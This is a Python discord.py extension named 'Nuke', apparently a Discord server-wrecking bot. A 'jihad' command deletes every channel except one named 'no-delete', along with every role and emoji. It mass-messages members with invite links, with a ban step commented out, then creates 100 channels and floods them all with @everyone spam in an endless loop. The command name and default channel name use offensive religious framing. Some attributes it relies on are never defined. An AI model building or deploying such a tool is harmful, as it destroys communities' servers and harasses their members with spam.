import discord
from discord.ext import commands

class Nuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def delete_channels(self, ctx):
        print("Deleted channels ( ", end='', flush=True)
        for channel in ctx.guild.channels:
            if not channel.name == "no-delete":
                try:
                    await channel.delete()
                    print(f"'{channel.name}', ", end='', flush=True)
                except:
                    pass
            else:
                pass
        print(')\n')

    async def delete_roles(self, ctx):
        print("Deleted roles ( ", end='', flush=True)
        for role in ctx.guild.roles:
            try:
                await role.delete()
                print(f"'{role.name}', ", end='', flush=True)
            except:
                pass
        print(')\n')

    async def delete_emojis(self, ctx):
        print("Deleted emojis ( ", end='', flush=True)
        for emoji in ctx.guild.emojis:
            try:
                await emoji.delete()
                print(f"'{emoji.name}', ", end='', flush=True)
            except:
                pass
        print(')\n')

    async def ban_members(self, ctx):
        print("Banned members ( ", end='', flush=True)
        for member in ctx.guild.members:
            try:
                if not member.id in self.no_ban:
                    # await ctx.guild.ban(member, reason="NUKE")
                    print(f"'{member.name}', ", end='', flush=True)
                    await member.send(f"{self.message}\n{self.invites}")
            except:
                pass
        print(')\n')

    async def make_channels(self, ctx, name):
        for i in range(100):
            try:
                await ctx.guild.create_text_channel(f"{name}")
            except:
                print(f"Created ( {i} channels )")

    async def spam_channel(self, ctx):
        while True:
            try:
                await ctx.send(f"{self.message}\n{self.invites}\n@everyone")
            except:
                pass

    async def spam_all_channels(self, ctx):
        for channel in ctx.guild.channels:
            if channel.name == "no-delete":
                continue
            try:
                await channel.send(">spam")
            except:
                pass

    @commands.Cog.listener()
    async def on_message(self, ctx):
        if ctx.author.bot:
            if ctx.content.startswith(">spam"):
                await self.spam_channel(ctx.channel)

    @commands.command()
    async def jihad(self, ctx, channelname="allahu-akbar"):
        await self.ban_members(ctx)
        await self.delete_channels(ctx)
        await self.delete_roles(ctx)
        await self.delete_emojis(ctx)
        await self.make_channels(ctx, channelname)
        await self.spam_all_channels(ctx)
        print("Done!")



def setup(bot):
    bot.add_cog(Nuke(bot))